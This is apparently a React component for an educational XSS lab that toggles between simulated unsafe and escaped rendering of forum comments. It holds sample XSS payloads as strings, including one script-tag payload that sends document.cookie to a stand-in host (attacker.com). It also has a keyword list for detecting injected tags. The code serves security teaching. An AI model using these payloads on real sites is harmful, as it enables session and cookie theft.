import React, { useState } from 'react';

interface XssSimulationProps {
  onStepComplete?: (stepNumber: number) => void;
  onSimulationSuccess?: () => void;
}

interface CommentEntry {
  id: string;
  author: string;
  content: string;
  timestamp: string;
  isExploit?: boolean;
}

export function XssSimulation({ onStepComplete, onSimulationSuccess }: XssSimulationProps) {
  const [isSecureMode, setIsSecureMode] = useState(false);
  const [authorName, setAuthorName] = useState('SecurityStudent');
  const [commentText, setCommentText] = useState('<img src="invalid-image" onerror="alert(\'XSS Triggered: Session Token Exposed!\')">');
  const [comments, setComments] = useState<CommentEntry[]>([
    {
      id: 'c1',
      author: 'AlexDeveloper',
      content: 'Welcome to the student cyber discussion board! Leave your feedback below.',
      timestamp: '10:14 AM',
    },
    {
      id: 'c2',
      author: 'ProfCarter',
      content: 'Reminder: Remember to review contextual HTML entity encoding before submitting homework.',
      timestamp: '10:28 AM',
    },
  ]);
  const [simulatedAlert, setSimulatedAlert] = useState<{
    visible: boolean;
    title: string;
    payloadText: string;
    cookieStolen: string;
  } | null>(null);

  const handleQuickPayload = (type: 'harmless' | 'img-onerror' | 'script-tag' | 'svg-onload') => {
    if (type === 'harmless') {
      setCommentText('This is a completely normal comment. I love the cybersecurity practicals!');
    } else if (type === 'img-onerror') {
      setCommentText('<img src="x" onerror="alert(\'XSS Vulnerability! Stolen Cookie: auth_session=8f9a2b\')">');
    } else if (type === 'script-tag') {
      setCommentText('<script>document.location="http://attacker.com/steal?c="+document.cookie</script>');
    } else if (type === 'svg-onload') {
      setCommentText('<svg onload="alert(\'Inline SVG DOM XSS Executed\')">');
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commentText.trim()) return;

    const hasScript =
      commentText.includes('<script') ||
      commentText.includes('onerror=') ||
      commentText.includes('onload=') ||
      commentText.includes('javascript:') ||
      commentText.includes('<img') ||
      commentText.includes('<svg');

    const newComment: CommentEntry = {
      id: `c_${Date.now()}`,
      author: authorName,
      content: commentText,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      isExploit: hasScript && !isSecureMode,
    };

    setComments((prev) => [newComment, ...prev]);

    if (!isSecureMode && hasScript) {
      // Simulate XSS alert in vulnerable mode
      setSimulatedAlert({
        visible: true,
        title: '⚠️ Simulated In-Page XSS Execution',
        payloadText: commentText,
        cookieStolen: 'auth_token=JWT_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      });
      onStepComplete?.(2);
      onSimulationSuccess?.();
    } else if (isSecureMode) {
      onStepComplete?.(3);
    } else {
      onStepComplete?.(1);
    }
  };

  const handleReset = () => {
    setIsSecureMode(false);
    setAuthorName('SecurityStudent');
    setCommentText('<img src="x" onerror="alert(\'XSS Triggered: Session Token Exposed!\')">');
    setSimulatedAlert(null);
    setComments([
      {
        id: 'c1',
        author: 'AlexDeveloper',
        content: 'Welcome to the student cyber discussion board! Leave your feedback below.',
        timestamp: '10:14 AM',
      },
      {
        id: 'c2',
        author: 'ProfCarter',
        content: 'Reminder: Remember to review contextual HTML entity encoding before submitting homework.',
        timestamp: '10:28 AM',
      },
    ]);
  };

  return (
    <div className="simulation-xss-root">
      {/* Mode Toolbar */}
      <div className="sim-mode-toolbar">
        <div className="sim-mode-info">
          <span className="sim-badge-label">Active Rendering:</span>
          <span className={`sim-mode-tag ${isSecureMode ? 'is-secure' : 'is-vulnerable'}`}>
            {isSecureMode ? '🛡️ Safe Encoding (textContent / Entity Escaped)' : '⚠️ Unsafe Rendering (innerHTML / Unsanitized)'}
          </span>
        </div>
        <div className="sim-mode-toggle-wrap">
          <label className="sim-switch">
            <input
              type="checkbox"
              checked={isSecureMode}
              onChange={(e) => {
                setIsSecureMode(e.target.checked);
                setSimulatedAlert(null);
              }}
            />
            <span className="sim-slider round" />
          </label>
          <span className="sim-switch-text">{isSecureMode ? 'Secure Escaping' : 'Vulnerable DOM'}</span>
        </div>
      </div>

      {/* Simulated Simulated XSS Alert Modal */}
      {simulatedAlert && (
        <div className="simulated-alert-overlay">
          <div className="simulated-alert-modal">
            <div className="alert-modal-header">
              <span className="alert-modal-icon">🚨</span>
              <h4>{simulatedAlert.title}</h4>
            </div>
            <div className="alert-modal-body">
              <p>
                Because the comment feed rendered your input using <code className="font-mono">innerHTML</code>, the
                browser parsed your HTML tags and fired the inline event handler!
              </p>
              <div className="alert-stolen-box">
                <span className="stolen-label">Simulated Stolen Document Cookie:</span>
                <code className="font-mono">{simulatedAlert.cookieStolen}</code>
              </div>
            </div>
            <div className="alert-modal-footer">
              <button
                type="button"
                className="btn-sim-action"
                onClick={() => setSimulatedAlert(null)}
              >
                Dismiss Simulated Alert
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="xss-grid-layout">
        {/* Left Column: Form & Payload Selection */}
        <div className="xss-input-card">
          <div className="sim-card-header">
            <span className="window-title">📝 Submit Forum Comment</span>
          </div>

          <div className="sim-card-body">
            <div className="quick-fill-bar">
              <span className="quick-fill-label">Payloads:</span>
              <button
                type="button"
                className="btn-quick-payload"
                onClick={() => handleQuickPayload('harmless')}
              >
                Harmless Text
              </button>
              <button
                type="button"
                className="btn-quick-payload payload-warn"
                onClick={() => handleQuickPayload('img-onerror')}
              >
                &lt;img onerror=...&gt;
              </button>
              <button
                type="button"
                className="btn-quick-payload payload-warn"
                onClick={() => handleQuickPayload('svg-onload')}
              >
                &lt;svg onload=...&gt;
              </button>
            </div>

            <form onSubmit={handleSubmit} className="xss-form">
              <div className="sim-field-group">
                <label htmlFor="xss-author">Display Author</label>
                <input
                  id="xss-author"
                  type="text"
                  className="sim-input"
                  value={authorName}
                  onChange={(e) => setAuthorName(e.target.value)}
                  required
                />
              </div>

              <div className="sim-field-group">
                <label htmlFor="xss-text">Comment Body (HTML or Plaintext)</label>
                <textarea
                  id="xss-text"
                  rows={4}
                  className="sim-input font-mono"
                  value={commentText}
                  onChange={(e) => setCommentText(e.target.value)}
                  placeholder="Enter your comment..."
                  required
                />
              </div>

              <div className="sim-form-actions">
                <button type="submit" className="btn-sim-action">
                  💬 Post Comment to Board
                </button>
                <button type="button" className="btn-sim-reset" onClick={handleReset}>
                  Reset Lab
                </button>
              </div>
            </form>

            <div className="xss-code-preview">
              <div className="db-section-label">Active Frontend DOM Rendering Code:</div>
              <pre className="font-mono code-snippet">
                {isSecureMode
                  ? `// SECURE: Browser automatically converts <, >, & to safe text
cardElement.textContent = commentText;`
                  : `// INSECURE: Browser interprets tags as live executable elements
cardElement.innerHTML = commentText;`}
              </pre>
            </div>
          </div>
        </div>

        {/* Right Column: Simulated Live Webpage Discussion Wall */}
        <div className="xss-preview-card">
          <div className="sim-card-header preview-header">
            <div className="window-dots">
              <span className="dot red" />
              <span className="dot yellow" />
              <span className="dot green" />
            </div>
            <span className="window-title">StudyVerse Discussion Wall (Live DOM)</span>
          </div>

          <div className="sim-card-body preview-body">
            <div className="comments-feed">
              {comments.map((c) => (
                <div
                  key={c.id}
                  className={`comment-bubble ${c.isExploit ? 'exploit-triggered' : ''}`}
                >
                  <div className="comment-header">
                    <span className="comment-author">👤 {c.author}</span>
                    <span className="comment-time">{c.timestamp}</span>
                    {c.isExploit && <span className="exploit-badge">⚠️ XSS Triggered</span>}
                  </div>

                  <div className="comment-content-area">
                    {isSecureMode ? (
                      // Secure rendering: Safe textContent display
                      <p className="comment-text-safe">{c.content}</p>
                    ) : (
                      // Vulnerable simulation: Simulated HTML execution preview
                      <div className="comment-text-vulnerable">
                        {c.content.includes('<') ? (
                          <div className="rendered-dom-box">
                            <span className="rendered-notice">[DOM Elements Parsed]</span>
                            <div className="dom-mock-output">
                              {c.content.includes('<img') && (
                                <div className="mock-img-error">
                                  <span>🖼️ Broken Image (onerror fired)</span>
                                </div>
                              )}
                              {c.content.includes('<svg') && (
                                <div className="mock-svg-node">
                                  <span>⚙️ Inline SVG Node Loaded</span>
                                </div>
                              )}
                              <code className="raw-markup font-mono">{c.content}</code>
                            </div>
                          </div>
                        ) : (
                          <p>{c.content}</p>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

